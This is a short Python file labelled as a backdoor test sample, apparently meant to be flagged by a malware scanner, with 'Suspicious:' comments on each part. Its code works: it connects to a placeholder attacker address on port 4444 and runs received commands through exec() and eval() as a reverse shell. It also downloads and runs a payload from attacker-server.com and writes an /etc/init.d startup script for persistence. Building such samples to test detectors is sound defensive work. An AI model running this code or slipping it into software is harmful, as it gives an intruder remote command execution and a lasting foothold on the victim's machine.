#!/usr/bin/env python3
"""
Backdoor Script - Test File 2
Simulates a reverse shell backdoor
"""

import socket
import subprocess
import base64

# Suspicious: Network connection to C&C server
ATTACKER_IP = "192.168.1.100"
ATTACKER_PORT = 4444

def establish_connection():
    # Suspicious: Creating socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    return s

def execute_commands(connection):
    while True:
        # Suspicious: Receiving and executing commands
        command = connection.recv(1024).decode()
        
        if command.lower() == "exit":
            break
        
        # Suspicious: exec() on remote commands
        exec(command)
        
        # Suspicious: eval() on remote input
        result = eval(command)
        connection.send(str(result).encode())

def download_payload():
    # Suspicious: Downloading additional malware
    import urllib.request
    payload_url = "http://attacker-server.com/malware.py"
    urllib.request.urlretrieve(payload_url, "/tmp/payload.py")
    
    # Suspicious: Executing downloaded payload
    exec(open("/tmp/payload.py").read())

def persistence():
    # Suspicious: Adding to startup (persistence mechanism)
    startup_script = """
    #!/bin/bash
    python3 /tmp/backdoor.py &
    """
    with open("/etc/init.d/malware", "w") as f:
        f.write(startup_script)

# Suspicious: Base64 obfuscation
obfuscated = base64.b64encode(b"malicious payload")

if __name__ == "__main__":
    conn = establish_connection()
    execute_commands(conn)
